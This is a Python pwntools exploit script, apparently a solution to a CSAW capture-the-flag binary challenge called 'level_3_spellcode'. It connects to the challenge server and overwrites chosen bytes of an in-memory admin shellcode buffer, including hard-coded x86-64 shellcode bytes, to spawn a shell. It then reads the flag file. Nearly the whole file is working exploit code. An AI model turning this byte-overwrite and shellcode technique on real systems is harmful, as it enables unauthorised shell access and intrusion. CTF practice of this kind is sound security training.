#!/usr/bin/env python3

from pwn import *
import base64

REMOTE = 1

admin_shellcode = b'\x90'*31 + b'\x48\x83\xec\x08\xe9\x0e\xeb\xdf\xff'
print('admin_shellcode:',admin_shellcode)

'''
Goal: Overwrite one byte of admin_shellcode with a non-null byte
      to pop a shell.
'''

offset = [36, 12, 13]
byte = [b'\x50', b'\x90',b'\x90']

assert all([offset[i] < 0x28 and offset[i] > -1 and byte[i] != b'\0' for i in range(len(offset))])

def interact_round(i):
    print(f"#### Interact round {i}, setting byte {offset[i]} to {hex(byte[i][0])} ####")
    print(p.recvuntil(b"write to (0-39): > "))
    print('>>>',offset[i])
    p.sendline(str(offset[i]).encode())
    print(p.recv())
    print('>>>',byte[i])
    p.send(byte[i])

print("Not super reliable; if it hangs just do ^C and try running again\n")

if REMOTE:
    p = remote('pwn.red.csaw.io',5011)
else:
    p = gdb.debug('./level_3_spellcode', gdbscript=(''
        #+'break *0x00400c64\n'#1_Func
        #+'break *0x00400ac8\n'#2_AdminAttack
        #+'break *0x00400b4e\n'#3_runGame
         +'break *0x00400a06\n'#4_UserAttack
         +'break *0x006020c0\n'#5_Payload
         +'c\n'#load the program
         +'set *((char *)0x6020c0) = 0x90\n'#fix weird local issue
        )
        )

print(p.recv())

print('3')
p.sendline(b"3")

for i in range(len(offset)):
    interact_round(i)

print(p.recv())

p.interactive()

print('ls')
p.sendline(b'ls')

print(p.recv().decode('ascii'))

p.sendline(b'cat flag.txt')

print(p.recv().decode('ascii'))

p.close()
